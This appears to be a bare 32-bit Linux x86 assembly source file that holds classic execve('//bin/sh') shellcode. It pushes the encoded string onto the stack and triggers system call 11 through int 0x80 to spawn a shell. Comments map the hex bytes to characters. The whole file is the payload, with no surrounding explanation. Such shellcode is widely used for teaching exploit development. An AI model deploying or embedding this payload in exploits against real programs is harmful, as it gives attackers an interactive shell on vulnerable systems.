#/bin/sh
#	0x68 -> 'h'  0x73 -> 's'  0x2f -> '/'  0x6e -> 'n'
#	0x69 -> 'i'  0x62 -> 'b'  0x2f -> '/'  0x2f -> '/'

_start:
	xor %edx, %edx
	push %edx # edx = NULL
	push $0x68732f6e
	push $0x69622f2f
	movl %esp, %ebx #ebx = esp-> "//bin/sh"
	push %edx #NULL
	push %ebx #shellcode[0]
	movl %esp, %ecx #shellcode itself
	movb $0x0b, %al
	int $0x80

